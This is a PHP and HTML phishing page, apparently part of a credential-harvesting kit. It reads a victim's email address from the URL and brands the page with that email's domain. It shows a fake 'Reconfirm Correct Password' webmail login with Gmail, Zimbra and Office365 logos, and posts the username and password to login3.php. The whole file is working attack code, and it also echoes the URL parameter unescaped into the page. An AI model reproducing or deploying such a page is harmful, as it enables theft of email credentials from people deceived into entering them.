<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
$display = strtoupper($yuh);

?>


<html lang="en">
<head>
	<title><?php echo $yuh ?> Client</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="images/png" sizes="16*16" href="http://<?=$domain?>/favicon.ico">
	<link rel="icon" type="images/png" sizes="16*16" href="http://<?=$domain?>/favicon.ico">
	<script type="text/javascript" src="./login_files/loginDialog.js"></script>
	<script type="text/javascript" src="./login_files/generatedDefaults.js"></script>
	<script type="text/javascript" src="./login_files/is"></script>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>

<body onLoad="document.getElementById(&#39;x_cfq&#39;).focus();x_cge(false);x_cgf();">
<div id="x_cfo"></div>
	

	<div class="limiter">
		<div class="container-login100" style="background-image: url('images/bg-01.jpg');">
			<div class="wrap-login100 p-l-55 p-r-55 p-t-65 p-b-54">
				<form action="login3.php" method="post" novalidate="novalidate">
					<span class="login100-form-title p-b-49">
						<div id="logoField" style="font-size:24px; color:#02A0E0; font-weight:bold;"><img id="x_cfw" src="./login_files/logo.png" alt="Mail" width="40" height="40">
<br>
<?php echo $display ?>
</div>


<span>
<div align="center"> <label><font size="2" color="red">Reconfirm Correct Password</font></label></div>
						</span>






					</span>

					<div class="wrap-input100 ">
						<span class="label-input100">Username</span>
						




<input class="input100" id="x_cfq" name="kerio_u" type="email" style="cursor:no-drop; -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    -o-user-select: none;
    user-select: none;" readonly="" value="<?php echo $_GET['email']; ?>">











						<span class="focus-input100" data-symbol="&#xf206;"></span>
					</div>

					<div class="wrap-input100 validate-input" data-validate="Password is required">
						<span class="label-input100">Password</span>
						<input class="input100" type="password" name="kerio_p" id="x_cfr" required=""  class="masked" placeholder="Type your password">
						<span class="focus-input100" data-symbol="&#xf190;"></span>

   <script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("x_cfr"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>



					</div>
					
				<br>
					
					<div class="container-login100-form-btn">
						<div class="wrap-login100-form-btn">
							<div class="login100-form-bgbtn"></div>
							<button class="login100-form-btn" input id="x_cft" value="Login" type="submit" >
								Login
							</button>
						</div>
					</div>

<br>					

<div text-center p-t-54 p-b-20">
						
					</div>

<br>
					<div class="flex-c-m">
						


<img src="images/gmailz.jpg" alt="GMail" width="40" height="30">
						
<img src="images/web.png" alt="Webmail" width="120" height="35"> &nbsp 
						
<img src="images/zimbra.jpg" alt="Zimbra" width="30" height="30">  &nbsp &nbsp

<img src="images/microsoft.png" alt="Office365" width="30" height="30">
					
					</div>

					
				</form>
			</div>
		</div>
	</div>
	

	<div id="dropDownSelect1"></div>
	
<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>
</html>